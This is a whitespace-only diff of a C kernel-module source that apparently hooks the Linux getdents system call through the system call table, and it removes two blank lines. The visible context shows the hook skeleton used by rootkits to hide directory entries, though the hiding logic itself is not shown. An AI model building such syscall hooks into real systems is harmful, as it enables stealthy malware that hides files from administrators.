@@ -20,7 +20,6 @@ struct linux_dirent {
 static unsigned long **p_sys_call_table;
 asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent* dirp, unsigned int count);
 
-
 asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent* dirp, unsigned int count)
 {
         int nread;
@@ -53,7 +52,6 @@ asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent* dirp, uns
             }
             bpos += copied.d_reclen;
         }
-
         return nread;
 }
 
